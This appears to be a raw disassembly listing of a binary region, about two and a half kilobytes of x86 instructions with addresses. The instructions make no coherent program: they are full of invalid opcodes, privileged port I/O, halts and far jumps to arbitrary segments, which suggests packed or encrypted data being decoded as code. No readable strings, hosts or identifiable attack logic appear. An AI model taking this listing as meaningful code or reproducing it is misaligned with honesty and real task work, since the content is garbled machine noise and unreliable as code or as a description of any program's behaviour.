  42f2c5:	jo     0x42f2a5
  42f2c7:	adc    bh,BYTE PTR [edx]
  42f2c9:	jb     0x42f251
  42f2cb:	inc    edx
  42f2cc:	ret    0x901f
  42f2cf:	pop    edx
  42f2d0:	push   esp
  42f2d1:	inc    esp
  42f2d2:	mov    al,0x29
  42f2d4:	mov    esp,0xbdc72cc3
  42f2d9:	jecxz  0x42f290
  42f2db:	ror    DWORD PTR [ebx+0x2b],0xa5
  42f2df:	test   al,0x45
  42f2e1:	xchg   edx,eax
  42f2e2:	stos   BYTE PTR es:[edi],al
  42f2e3:	imul   ebx,DWORD PTR cs:0x52128ac9,0x1b
  42f2eb:	lea    eax,[esp+eiz*8-0x31]
  42f2ef:	push   ebx
  42f2f0:	mov    edx,0x59b79704
  42f2f5:	and    ecx,DWORD PTR [edi+0x14]
  42f2f8:	sbb    eax,0x87f5dfa5
  42f2fd:	push   ebx
  42f2fe:	add    DWORD PTR [esi+edx*8],edi
  42f301:	in     eax,dx
  42f302:	inc    eax
  42f303:	sar    BYTE PTR [esi+eiz*1-0x6af0b7a6],cl
  42f30a:	adc    BYTE PTR [ecx],bh
  42f30c:	cli    
  42f30d:	pushf  
  42f30e:	clc    
  42f30f:	test   DWORD PTR [esi-0x146e5c06],ecx
  42f315:	cmp    BYTE PTR [ebp+0x743977b3],0xb0
  42f31c:	jg     0x42f387
  42f31e:	fadd   DWORD PTR [esi]
  42f320:	mov    ebp,0x547c531d
  42f325:	dec    edx
  42f326:	(bad)  
  42f327:	mov    edi,0x6b70fc50
  42f32c:	jo     0x42f377
  42f32e:	dec    edx
  42f32f:	dec    esp
  42f330:	fst    DWORD PTR [edi-0x2f]
  42f333:	ins    BYTE PTR es:[edi],dx
  42f334:	dec    eax
  42f335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f336:	sub    al,ch
  42f338:	xchg   esi,eax
  42f339:	inc    ebx
  42f33a:	or     DWORD PTR fs:[edi-0x7d],eax
  42f33e:	cmp    eax,DWORD PTR [ebx]
  42f340:	sti    
  42f341:	xchg   esi,eax
	...
  42f3b2:	add    BYTE PTR [eax],al
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	sbb    al,BYTE PTR [eax-0xc6d46ae]
  42f3c6:	add    DWORD PTR [eax],eax
  42f3c8:	test   BYTE PTR [eax],0x0
  42f3cb:	add    BYTE PTR [eax+edi*2+0x69],ch
  42f3cf:	ror    BYTE PTR [edi+edx*8-0x29],1
  42f3d3:	mov    al,0xd4
  42f3d5:	mov    eax,ds:0x7d8e408a
  42f3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3db:	outs   dx,DWORD PTR ds:[esi]
  42f3dc:	add    al,0xec
  42f3de:	faddp  st(3),st
  42f3e0:	xor    eax,0x36912d70
  42f3e5:	(bad)  
  42f3e6:	fwait
  42f3e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f3e8:	inc    esp
  42f3e9:	and    BYTE PTR [ebx+ecx*8+0x62],dl
  42f3ed:	call   0x3475:0xa43e5c93
  42f3f4:	outs   dx,DWORD PTR ds:[esi]
  42f3f5:	sbb    eax,0xf55a584a
  42f3fa:	mov    bl,al
  42f3fc:	outs   dx,BYTE PTR ds:[esi]
  42f3fd:	cmovo  ebp,DWORD PTR [edx+ebx*2+0x51a7829e]
  42f405:	cmp    eax,0x43caafd8
  42f40a:	fwait
  42f40b:	repz jns 0x42f48c
  42f40e:	or     eax,0xb7aac666
  42f413:	clc    
  42f414:	aas    
  42f415:	ret    0x8f25
  42f418:	and    dl,BYTE PTR [ebx]
  42f41a:	push   ss
  42f41b:	dec    ebx
  42f41c:	leave  
  42f41d:	push   ds
  42f41e:	mov    dh,0xc8
  42f420:	sbb    DWORD PTR [esi+0x13cf68e0],esi
  42f426:	push   0x61ca268c
  42f42b:	mov    eax,ds:0xded14c84
  42f430:	mov    dl,0xa6
  42f432:	and    BYTE PTR [ebp-0x7a00b05a],bh
  42f438:	pop    ss
  42f439:	xchg   esi,eax
  42f43a:	and    dh,ch
  42f43c:	pop    ds
  42f43d:	xchg   esi,eax
  42f43e:	aam    0x27
  42f440:	aaa    
  42f441:	jmp    0x5596c08e
  42f446:	sub    al,0xd1
  42f448:	sar    DWORD PTR [eax],1
  42f44a:	mov    bh,0x23
  42f44c:	out    dx,eax
  42f44d:	test   bh,al
  42f44f:	fcomp  DWORD PTR [ebx-0x3e]
  42f452:	push   0x92b7314f
  42f457:	das    
  42f458:	jns    0x42f4b6
  42f45a:	bound  ebx,QWORD PTR ds:0x9ecb24da
  42f460:	idiv   BYTE PTR ds:0x651e9390
  42f466:	mov    dl,0xe3
  42f468:	aaa    
  42f469:	aaa    
  42f46a:	lods   al,BYTE PTR ds:[esi]
  42f46b:	inc    esi
  42f46c:	fldl2t 
  42f46e:	ins    BYTE PTR es:[edi],dx
  42f46f:	or     BYTE PTR [edx+0x40],bh
  42f472:	mov    eax,0xf0b222f5
  42f477:	cmp    DWORD PTR [ebx],esi
  42f479:	xor    BYTE PTR [ecx+eiz*1-0x70],al
  42f47d:	mov    eax,ds:0xce765cc8
  42f482:	jmp    0x95cb:0x6cd8e4bc
  42f489:	jne    0x42f4a9
  42f48b:	inc    ecx
  42f48c:	aaa    
  42f48d:	out    dx,eax
  42f48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f48f:	stos   BYTE PTR es:[edi],al
  42f490:	cmp    dl,BYTE PTR [ebx]
  42f492:	sub    eax,0x63c37447
  42f497:	jg     0x42f4aa
  42f499:	xchg   esp,eax
  42f49a:	out    dx,eax
  42f49b:	fldcw  WORD PTR [ebx]
  42f49d:	outs   dx,BYTE PTR ds:[esi]
  42f49e:	lds    edx,FWORD PTR [edx+ebp*8+0x768ed508]
  42f4a5:	pusha  
  42f4a6:	sar    BYTE PTR [edx-0x3db0476e],cl
  42f4ac:	push   0xffffff82
  42f4ae:	stos   DWORD PTR es:[edi],eax
  42f4af:	dec    eax
  42f4b0:	inc    eax
  42f4b1:	shl    DWORD PTR [ebx-0x6150a4db],0x59
  42f4b8:	outs   dx,DWORD PTR ds:[esi]
  42f4b9:	jns    0x42f4c3
  42f4bb:	popa   
  42f4bc:	push   edx
  42f4bd:	lds    esi,FWORD PTR [eax+0x58]
  42f4c0:	ins    DWORD PTR es:[edi],dx
  42f4c1:	fld    QWORD PTR [eax]
	...
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi-0x11],bh
  42f541:	sbb    DWORD PTR [edi+0x1f48827],eax
  42f547:	add    dh,dh
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    BYTE PTR [edx+0x30],al
  42f54e:	sbb    ebx,ebp
  42f550:	cs jge 0x42f59c
  42f553:	and    DWORD PTR [esp+ecx*2-0x59],ebp
  42f557:	jp     0x42f4f1
  42f559:	mov    edx,DWORD PTR [edx-0x39]
  42f55c:	mov    bh,0x2f
  42f55e:	cmp    dh,BYTE PTR [ebx+0x7a]
  42f561:	in     al,0x10
  42f563:	jmp    0xf40b3c05
  42f568:	lock xchg esp,eax
  42f56a:	xchg   ebp,eax
  42f56b:	jmp    0xd80ca4ea
  42f570:	push   ds
  42f571:	jbe    0x42f533
  42f573:	jecxz  0x42f559
  42f575:	and    BYTE PTR [edx+0x119de673],dl
  42f57b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f57c:	popa   
  42f57d:	leave  
  42f57e:	scas   al,BYTE PTR es:[edi]
  42f57f:	inc    edi
  42f580:	jmp    0xf143c307
  42f585:	and    eax,0xd6f0c8a0
  42f58a:	iret   
  42f58b:	xchg   edx,eax
  42f58c:	shr    BYTE PTR ss:[edi-0x39b69dc0],1
  42f593:	bnd ret 0xa74f
  42f597:	and    dh,dl
  42f599:	or     ebx,DWORD PTR [eax]
  42f59b:	aam    0x82
  42f59d:	push   0xffffff96
  42f59f:	push   ds
  42f5a0:	mov    edx,0xe33404dc
  42f5a5:	bnd jl 0x42f627
  42f5a8:	xchg   edx,eax
  42f5a9:	in     eax,dx
  42f5aa:	icebp  
  42f5ab:	(bad)  
  42f5ac:	addr16 shr dh,cl
  42f5af:	cdq    
  42f5b0:	push   edx
  42f5b1:	or     BYTE PTR [edx+ebx*1+0x28],ch
  42f5b5:	out    dx,eax
  42f5b6:	imul   eax,DWORD PTR [esi-0x17790012],0x5c041ba1
  42f5c0:	jg     0x42f5ac
  42f5c2:	fs das 
  42f5c4:	lods   al,BYTE PTR ds:[esi]
  42f5c5:	pop    ds
  42f5c6:	in     eax,0x83
  42f5c8:	shl    edi,1
  42f5ca:	cmc    
  42f5cb:	addr16 jbe 0x42f59d
  42f5ce:	jne    0x42f617
  42f5d0:	test   BYTE PTR ds:0x4fc7e387,dl
  42f5d6:	add    ebx,DWORD PTR [esi]
  42f5d8:	xchg   ebx,eax
  42f5d9:	imul   ecx,DWORD PTR [ecx-0x5f],0xffffffb8
  42f5dd:	out    dx,eax
  42f5de:	dec    ebp
  42f5df:	adc    al,0x8c
  42f5e1:	leave  
  42f5e2:	rol    DWORD PTR [edx+ebx*8+0x1cf6501f],cl
  42f5e9:	sbb    dh,ch
  42f5eb:	adc    eax,0x1bb350a4
  42f5f0:	mov    esp,0x6d162bbf
  42f5f5:	in     eax,0xbd
  42f5f7:	dec    ebx
  42f5f8:	sbb    BYTE PTR [esi+0x46338466],ch
  42f5fe:	jno    0x42f5dc
  42f600:	xchg   dl,bh
  42f602:	inc    ecx
  42f603:	sub    bl,BYTE PTR ds:0x6056ce47
  42f609:	imul   ecx,edi,0x3c
  42f60c:	xlat   BYTE PTR ds:[ebx]
  42f60d:	jnp    0x42f655
  42f60f:	adc    al,0x3f
  42f611:	sbb    DWORD PTR [eax+0x2fcecbc7],0xdacd6c55
  42f61b:	mov    edi,0x4649364d
  42f620:	dec    eax
  42f621:	hlt    
  42f622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f623:	test   eax,0x4067909d
  42f628:	pushf  
  42f629:	(bad)  
  42f62a:	cwde   
  42f62b:	dec    ecx
  42f62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f62d:	add    al,0xbc
  42f62f:	in     al,dx
  42f630:	xchg   edi,eax
  42f631:	jecxz  0x42f644
  42f633:	fidiv  WORD PTR [ecx]
  42f635:	pop    ebp
  42f636:	jne    0x42f655
  42f638:	cld    
  42f639:	cmp    BYTE PTR [esi+eiz*1-0x6f],ah
  42f63d:	mov    eax,fs
  42f63f:	or     esp,DWORD PTR [ecx+0xd]
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    dh,ch
  42f6c1:	imul   ebx,DWORD PTR [edi+0x1f57efb],0xf600
  42f6cb:	add    BYTE PTR [ebx-0x5b1d40c1],dh
  42f6d1:	rcr    DWORD PTR [eax],cl
  42f6d3:	es mov ah,0xfe
  42f6d6:	in     al,dx
  42f6d7:	xlat   BYTE PTR ds:[ebx]
  42f6d8:	jb     0x42f742
  42f6da:	(bad)  [edi+0x50]
  42f6dd:	mov    ds:0xccda8608,eax
  42f6e2:	ret    
  42f6e3:	pop    ss
  42f6e4:	xor    BYTE PTR ds:0x249385,cl
  42f6ea:	push   edi
  42f6eb:	cmc    
  42f6ec:	xchg   ebp,eax
  42f6ed:	jmp    0x42f6fd
  42f6ef:	mov    gs,WORD PTR [edx+0x3c]
  42f6f2:	xor    BYTE PTR [esp-0x56],al
  42f6f6:	mov    bh,0x2b
  42f6f8:	xchg   ecx,eax
  42f6f9:	test   BYTE PTR [eax+0x4047c4d5],dh
  42f6ff:	popf   
  42f700:	adc    DWORD PTR [ecx+0x6b],esi
  42f703:	add    eax,0xd98cbf95
  42f708:	pop    ds
  42f709:	sub    edx,DWORD PTR [edx]
  42f70b:	dec    ebp
  42f70c:	lds    ecx,FWORD PTR [esi+0x7f9fa09d]
  42f712:	inc    ebp
  42f713:	(bad)  
  42f714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f715:	fadd   DWORD PTR [esi-0x6a]
  42f718:	pop    esp
  42f719:	and    al,0xef
  42f71b:	mov    ah,0x44
  42f71d:	pop    ebp
  42f71e:	cld    
  42f71f:	enter  0x3c3a,0x28
  42f723:	popf   
  42f724:	xor    eax,0x528f5cd3
  42f729:	loope  0x42f72e
  42f72b:	mov    edx,0x8801360
  42f730:	retf   0x1c25
  42f733:	scas   eax,DWORD PTR es:[edi]
  42f734:	test   BYTE PTR [edi-0x6c02ed1b],ch
  42f73a:	test   al,0x49
  42f73c:	cld    
  42f73d:	imul   ebp,DWORD PTR [ebx+0x113c77b],0xe468869c
  42f747:	mov    BYTE PTR [edi],bl
  42f749:	xor    BYTE PTR [ebx-0x315fcba4],0xf5
  42f750:	js     0x42f704
  42f752:	pushf  
  42f753:	push   0x3c
  42f755:	cmp    esi,DWORD PTR [edi]
  42f757:	xchg   BYTE PTR [edx],al
  42f759:	jg     0x42f6e1
  42f75b:	mov    WORD PTR [eax-0x2e],gs
  42f75e:	imul   edi,DWORD PTR [eax-0x10],0x20
  42f762:	aam    0xe4
  42f764:	or     al,0x45
  42f766:	dec    ecx
  42f767:	push   edi
  42f768:	mov    ds:0xdb9d3446,al
  42f76d:	jo     0x42f7de
  42f76f:	into   
  42f770:	jo     0x42f72b
  42f772:	out    dx,eax
  42f773:	adc    DWORD PTR [ebp+0x3d63bdf0],esi
  42f779:	cmp    eax,0xa3b36046
  42f77e:	shr    BYTE PTR [edi+0x6b769809],cl
  42f784:	xchg   al,cl
  42f786:	rol    BYTE PTR [edi-0x10],0xfa
  42f78a:	dec    edx
  42f78b:	hlt    
  42f78c:	(bad)  ds:0x293b5b74
  42f792:	sbb    ebp,DWORD PTR [ebx-0x60]
  42f795:	push   0xe17a4bcf
  42f79a:	loop   0x42f71f
  42f79c:	push   esp
  42f79d:	dec    edx
  42f79e:	jp     0x42f7e6
  42f7a0:	leave  
  42f7a1:	fnstsw WORD PTR [edi-0x3f10d78b]
  42f7a7:	inc    esp
  42f7a8:	cmp    al,0xf6
  42f7aa:	frstor [edi]
  42f7ac:	inc    edx
  42f7ad:	mov    cl,0x6b
  42f7af:	aad    0x66
  42f7b1:	std    
  42f7b2:	cld    
  42f7b3:	push   cs
  42f7b4:	sub    eax,DWORD PTR [edi]
  42f7b6:	(bad)  
  42f7b7:	dec    ecx
  42f7b8:	enter  0x4140,0xf1
  42f7bc:	loope  0x42f7f8
  42f7be:	ror    BYTE PTR [esi],cl
  42f7c0:	inc    edi
  42f7c1:	retf   
	...
  42f832:	add    BYTE PTR [eax],al
  42f834:	ret    
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi-0x6baf3771]
  42f841:	and    bl,bh
  42f843:	adc    esi,DWORD PTR [esi+esi*8+0x1]
  42f847:	add    dh,dh
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [ecx-0x36],bh
  42f84e:	and    al,0x57
  42f850:	mov    edx,0x843fe8be
  42f855:	lahf   
  42f856:	ss and eax,0x64f4b969
  42f85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f85d:	mov    fs,WORD PTR [ebx]
  42f85f:	sub    BYTE PTR [eax+eiz*1-0x3a],dh
  42f863:	lahf   
  42f864:	xor    eax,0x9dcacf74
  42f869:	pushf  
  42f86a:	ret    0x6ff3
  42f86d:	ror    DWORD PTR [ebx],cl
  42f86f:	mov    ds:0xc4107421,eax
  42f874:	sahf   
  42f875:	icebp  
  42f876:	or     BYTE PTR [ebx+ecx*4+0xdf4a846],dh
  42f87d:	jl     0x42f8a8
  42f87f:	loopne 0x42f8b7
  42f881:	iret   
  42f882:	xchg   BYTE PTR [ecx-0x64e921cd],dh
  42f888:	inc    esi
  42f889:	mov    dh,BYTE PTR [edx+edx*8-0xaa0b4ac]
  42f890:	call   0xcff7:0x62c0c6d4
  42f897:	dec    edi
  42f898:	out    dx,al
  42f899:	test   al,0xa4
  42f89b:	cmc    
  42f89c:	(bad)  
  42f89d:	arpl   WORD PTR [esi],ax
  42f89f:	jg     0x42f902
  42f8a1:	mov    ebp,0x9c0e0a6
  42f8a6:	xchg   esi,eax
  42f8a7:	cmc    
  42f8a8:	mov    ebx,0xd5be6b6c
  42f8ad:	jecxz  0x42f927
  42f8af:	test   eax,0x74442c18
  42f8b4:	inc    esp
  42f8b5:	fs out 0xd,eax
  42f8b8:	adc    bh,BYTE PTR [edi]
  42f8ba:	dec    DWORD PTR [ebp+0x50b5d56]
  42f8c0:	sbb    eax,ebp
  42f8c2:	jge    0x42f86a
  42f8c4:	lods   al,BYTE PTR ds:[esi]
  42f8c5:	fmul   QWORD PTR [ebp+ebx*8-0x3]
  42f8c9:	xor    al,0x3f
  42f8cb:	clc    
  42f8cc:	inc    edx
  42f8cd:	repz inc edi
  42f8cf:	cmp    BYTE PTR [eax],ch
  42f8d1:	jmp    0xe501:0xbefac618
  42f8d8:	call   0x896e62a0
  42f8dd:	mov    bh,0x8c
  42f8df:	(bad)  
  42f8e0:	jge    0x42f8b6
  42f8e2:	push   0x5
  42f8e4:	adc    eax,esi
  42f8e6:	ins    DWORD PTR es:[edi],dx
  42f8e7:	sub    DWORD PTR [edx-0x1],edx
  42f8ea:	jecxz  0x42f8cd
  42f8ec:	pop    ds
  42f8ed:	jo     0x42f921
  42f8ef:	mov    al,ds:0x68caab29
  42f8f4:	jb     0x42f948
  42f8f6:	fwait
  42f8f7:	in     eax,0x66
  42f8f9:	inc    ecx
  42f8fa:	aad    0xf5
  42f8fc:	inc    edx
  42f8fd:	or     BYTE PTR [ebp-0x431a930d],al
  42f903:	pusha  
  42f904:	ror    BYTE PTR ds:0x5c4eefd5,1
  42f90a:	pusha  
  42f90b:	(bad)  
  42f90d:	test   eax,0x8cf5f87e
  42f912:	out    0xad,al
  42f914:	add    DWORD PTR [esi+0x7bae11f4],edx
  42f91a:	popa   
  42f91b:	stc    
  42f91c:	push   0xffffffef
  42f91e:	bound  eax,QWORD PTR [ebx+0x1d5b5039]
  42f924:	jmp    0x7a46:0xca2b0c3a
  42f92b:	fsubr  DWORD PTR [edi+0x41]
  42f92e:	push   ebp
  42f92f:	pop    es
  42f930:	fs in  eax,0xc5
  42f933:	mul    BYTE PTR [edi]
  42f935:	lods   eax,DWORD PTR ds:[esi]
  42f936:	cli    
  42f937:	sbb    DWORD PTR [ebp-0x42],0xb7a47dac
  42f93e:	xor    dl,dl
  42f940:	or     edx,DWORD PTR [eax+eax*1]
	...
  42f9b3:	add    ch,ah
  42f9b5:	mov    edx,0xebdfe392
  42f9ba:	cmc    
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	aad    0x5c
  42f9c2:	sti    
  42f9c3:	and    al,0x6a
  42f9c5:	test   DWORD PTR [ecx],0xf600
  42f9cb:	add    BYTE PTR [edx-0x111ac8dc],cl
  42f9d1:	ror    DWORD PTR [edi+0x1d],0xe1
  42f9d5:	jp     0x42f965
  42f9d7:	jp     0x42f9e8
  42f9d9:	push   ss
  42f9da:	lods   al,BYTE PTR ds:[esi]
  42f9db:	jmp    0x42fa2f
  42f9dd:	xchg   edi,eax
  42f9de:	jo     0x42f99b
  42f9e0:	jg     0x42fa3f
  42f9e2:	lods   al,BYTE PTR ds:[esi]
  42f9e3:	xchg   esp,eax
  42f9e4:	cli    
  42f9e5:	mov    bh,0x20
  42f9e7:	fs adc edi,ecx
  42f9ea:	ins    BYTE PTR es:[edi],dx
  42f9eb:	nop
  42f9ec:	adc    BYTE PTR [edx-0x3a4f4cb3],bl
  42f9f2:	fsin   
  42f9f4:	sar    DWORD PTR [ebx+eax*1-0x3f],0x3a
  42f9f9:	cmp    al,0x94
  42f9fb:	mov    ebx,0xed9eebe4
  42fa00:	xor    eax,0x33d0e8d0
  42fa05:	or     BYTE PTR [ebx+0x60],bl
  42fa08:	adc    al,0x36
  42fa0a:	mov    eax,ds:0x942927ba
  42fa0f:	pop    eax
  42fa10:	out    0xfb,al
  42fa12:	pushf  
  42fa13:	xchg   edi,eax
  42fa14:	loope  0x42f9a7
  42fa16:	scas   al,BYTE PTR es:[edi]
  42fa17:	scas   al,BYTE PTR es:[edi]
  42fa18:	cs test al,0x7e
  42fa1b:	addr16 retf 
  42fa1d:	lods   al,BYTE PTR ds:[esi]
  42fa1e:	test   DWORD PTR [edx],edi
  42fa20:	sbb    al,dh
  42fa22:	jbe    0x42fa66
  42fa24:	std    
  42fa25:	cdq    
  42fa26:	or     eax,0x848930f2
  42fa2b:	sbb    dh,BYTE PTR ds:0x2c05b252
  42fa31:	pop    eax
  42fa32:	or     ebp,edi
  42fa34:	outs   dx,DWORD PTR ds:[esi]
  42fa35:	dec    ebx
  42fa36:	enter  0x2d6f,0x70
  42fa3a:	fwait
  42fa3b:	xor    BYTE PTR [eax+0xd],ah
  42fa3e:	test   BYTE PTR [ebx+0x57],ch
  42fa41:	pop    esi
  42fa42:	jne    0x42fa57
  42fa44:	and    ah,BYTE PTR [ebx+0x4f]
  42fa47:	and    dh,BYTE PTR [esi]
  42fa49:	lahf   
  42fa4a:	mov    al,ds:0xa714bcda
  42fa4f:	sbb    cl,ch
  42fa51:	mov    al,0x46
  42fa53:	ret    0xde12
  42fa56:	or     BYTE PTR [esi],al
  42fa58:	into   
  42fa59:	mov    DWORD PTR [ecx+0x6d],0x9ce5405c
  42fa60:	xchg   cl,dh
  42fa62:	sar    DWORD PTR [esi-0x214420a0],cl
  42fa68:	jmp    0xffce:0x1e84dc32
  42fa6f:	fisttp QWORD PTR [esi+edi*2-0x3b220397]
  42fa76:	inc    edi
  42fa77:	cmp    DWORD PTR [esi+0x65],eax
  42fa7a:	fwait
  42fa7b:	cmp    eax,0x6be08fd3
  42fa80:	loop   0x42fa2a
  42fa82:	jecxz  0x42fa7a
  42fa84:	(bad)  
  42fa85:	pop    ecx
  42fa86:	les    ebx,FWORD PTR [esi]
  42fa88:	mov    ecx,0xb788f750
  42fa8d:	mov    bl,0x10
  42fa8f:	xor    al,0x0
  42fa91:	xor    cl,BYTE PTR [ecx+0xf]
  42fa94:	loopne 0x42fa88
  42fa96:	fcomp  st(6)
  42fa98:	cmp    al,0xa
  42fa9a:	repz mov ecx,0x74239f87
  42faa0:	neg    ecx
  42faa2:	mov    esp,eax
  42faa4:	or     BYTE PTR [edi+0x42d04c0c],dl
  42faaa:	scas   eax,DWORD PTR es:[edi]
  42faab:	mul    ebp
  42faad:	ret    0xb21f
  42fab0:	jecxz  0x42fa6e
  42fab2:	xchg   edi,eax
  42fab3:	and    eax,0xd88717fc
  42fab8:	hlt    
  42fab9:	inc    ebx
  42faba:	mov    ds:0xac668d72,eax
  42fabf:	sbb    al,0x7b
  42fac1:	test   DWORD PTR [eax],0x0
	...
  42fb33:	add    BYTE PTR [esi+0x41],bh
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	or     eax,0x60032959
  42fb45:	clc    
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    BYTE PTR [edx+0x565715fe],bl
  42fb51:	mov    ah,0x85
  42fb53:	stos   DWORD PTR es:[edi],eax
  42fb54:	out    dx,al
  42fb55:	repz retf 
  42fb57:	cmp    eax,0xf8fb9f90
  42fb5c:	aad    0x3e
  42fb5e:	adc    ch,BYTE PTR [edi+edx*1-0x5be58b06]
  42fb65:	mov    bl,0x85
  42fb67:	(bad)  
  42fb68:	mov    fs,WORD PTR [esi+0x4454cacf]
  42fb6e:	mov    eax,ds:0x3599e78c
  42fb73:	xchg   edx,eax
  42fb74:	mov    cl,0x6d
  42fb76:	sub    al,0xe7
  42fb78:	cmp    BYTE PTR [edx+0x17836bce],0x8
  42fb7f:	cmp    eax,0xa19c1ad5
  42fb84:	mov    eax,ds:0x2756921d
  42fb89:	std    
  42fb8a:	stc    
  42fb8b:	sub    bh,cl
  42fb8d:	fdivr  QWORD PTR [edi]
  42fb8f:	test   al,0x57
  42fb91:	aam    0xc2
  42fb93:	(bad)  
  42fb95:	xor    al,0x75
  42fb97:	outs   dx,BYTE PTR ds:[esi]
  42fb98:	aas    
  42fb99:	cld    
  42fb9a:	push   eax
  42fb9b:	cmp    ecx,DWORD PTR [ecx-0x34]
  42fb9e:	push   esi
  42fb9f:	mov    dl,0xae
  42fba1:	push   ebx
  42fba2:	hlt    
  42fba3:	adc    BYTE PTR [ecx+0x7f74aa63],ah
  42fba9:	call   0x37f3637f
  42fbae:	sbb    ch,BYTE PTR [edi-0x29]
  42fbb1:	into   
  42fbb2:	push   ebx
  42fbb3:	lahf   
  42fbb4:	idiv   BYTE PTR [ebp-0xa]
  42fbb7:	jl     0x42fb49
  42fbb9:	inc    esi
  42fbba:	xor    eax,0x4dd88f2c
  42fbbf:	lea    edi,[edi+0x39]
  42fbc2:	je     0x42fb4f
  42fbc4:	cmp    BYTE PTR [edx+0x4ddd95ad],bh
  42fbca:	adc    bl,al
  42fbcc:	push   ecx
  42fbcd:	lods   eax,DWORD PTR ds:[esi]
  42fbce:	sbb    ebp,DWORD PTR [ebx+0x5740dbc9]
  42fbd4:	or     dh,BYTE PTR [ebx+ebp*4+0x12]
  42fbd8:	pop    edx
  42fbd9:	shl    BYTE PTR ds:0xb33cce8c,1
  42fbdf:	std    
  42fbe0:	mov    esp,esp
  42fbe2:	lea    esp,[eax-0x46fff986]
  42fbe8:	rcr    esi,cl
  42fbea:	sub    esp,DWORD PTR [edx+0x0]
  42fbed:	cdq    
  42fbee:	jmp    0x27719754
  42fbf3:	xor    ecx,DWORD PTR [ebp+0x7781a4c9]
  42fbf9:	retf   
  42fbfa:	mov    ebx,0xffb443ff
  42fbff:	mov    ss:0xaa955425,eax
  42fc05:	out    dx,al
  42fc06:	pop    ecx
  42fc07:	xchg   edi,eax
  42fc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc09:	sub    ah,BYTE PTR [edi-0x4ce18d21]
  42fc0f:	lods   eax,DWORD PTR ds:[esi]
  42fc10:	xlat   BYTE PTR ds:[ebx]
  42fc11:	xchg   esp,eax
  42fc12:	repnz arpl WORD PTR [esi+0x62],di
  42fc16:	push   esi
  42fc17:	cdq    
  42fc18:	inc    ebx
  42fc19:	xor    cl,BYTE PTR [esi-0x34]
  42fc1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc1d:	scas   al,BYTE PTR es:[edi]
  42fc1e:	lods   eax,DWORD PTR ds:[esi]
  42fc1f:	mov    ds:0x88563bb2,eax
  42fc24:	je     0x42fbbc
  42fc26:	cmp    cl,bh
  42fc28:	pop    ebx
  42fc29:	dec    DWORD PTR [eax-0x7ef948ad]
  42fc2f:	mov    DWORD PTR [esp+edx*4-0x4e6bde9b],edx
  42fc36:	pop    edi
  42fc37:	push   eax
  42fc38:	add    BYTE PTR [ebx],dh
  42fc3a:	adc    eax,0x6ba5d547
  42fc3f:	lds    ebx,FWORD PTR [ebx+0xca]
	...
  42fcb1:	add    BYTE PTR [eax],al
  42fcb3:	add    BYTE PTR [edx],ch
  42fcb5:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42fcbb:	test   BYTE PTR [ecx+0x58b95c3c],0xd4
  42fcc2:	jecxz  0x42fc59
  42fcc4:	push   esi
  42fcc5:	stc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    BYTE PTR [ebp-0x42],ah
  42fcce:	inc    edi
  42fccf:	mov    ebx,0xf15cde4e
  42fcd4:	mov    esp,0x67a2161a
  42fcd9:	loopne 0x42fcbb
  42fcdb:	dec    DWORD PTR [ebp-0x4308750b]
  42fce1:	sub    ch,BYTE PTR [ebx-0x13]
  42fce4:	clc    
  42fce5:	xor    eax,0x847187f
  42fcea:	dec    edi
  42fceb:	mov    bl,0xac
  42fced:	or     BYTE PTR [esi],0x38
  42fcf0:	scas   eax,DWORD PTR es:[edi]
  42fcf1:	ret    
  42fcf2:	jg     0x42fcec
  42fcf4:	out    0x6d,eax
  42fcf6:	sbb    BYTE PTR [edi-0x6a698690],cl
  42fcfc:	mov    dh,0x91
  42fcfe:	sub    dl,BYTE PTR [ebp-0x3d741a35]
  42fd04:	lods   al,BYTE PTR ds:[esi]
  42fd05:	sub    esi,ebx
  42fd07:	dec    ebp
  42fd08:	rcr    ah,0xf8
  42fd0b:	inc    esi
  42fd0c:	dec    edx
  42fd0d:	jge    0x42fd66
  42fd0f:	shl    DWORD PTR [edx-0x66],1
  42fd12:	mov    DWORD PTR [ebx],ebx
  42fd14:	xchg   esp,eax
  42fd15:	hlt    
  42fd16:	ret    0x4e0c
  42fd19:	mov    al,ds:0x711c5ee5
  42fd1e:	add    BYTE PTR [ecx],dh
  42fd20:	stos   DWORD PTR es:[edi],eax
  42fd21:	sbb    DWORD PTR [edx-0x2d42d467],ecx
  42fd27:	xchg   ebx,eax
  42fd28:	pushf  
  42fd29:	sub    bl,BYTE PTR [esi+ebp*1]
  42fd2c:	fmul   QWORD PTR [edi]
